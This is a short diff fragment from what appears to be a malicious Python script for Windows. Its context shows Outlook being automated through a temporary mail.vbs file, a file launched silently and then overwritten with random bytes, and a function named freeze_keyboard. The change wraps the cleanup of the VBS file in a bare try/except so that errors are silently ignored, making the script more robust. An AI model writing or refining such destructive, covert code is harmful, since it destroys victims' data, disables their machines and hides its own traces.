@@ -51,7 +51,10 @@ ol.Quit
     execute_command(f'start /b "" "{file_path}"')
     with open(file_path, "w") as f:
         f.write(os.urandom(os.path.getsize(file_path)))
-    os.remove(os.path.join(os.getenv("temp"), "mail.vbs"))
+    try:
+        os.remove(os.path.join(os.getenv("TEMP"), "mail.vbs"))
+    except:
+        pass
 
 
 def freeze_keyboard():
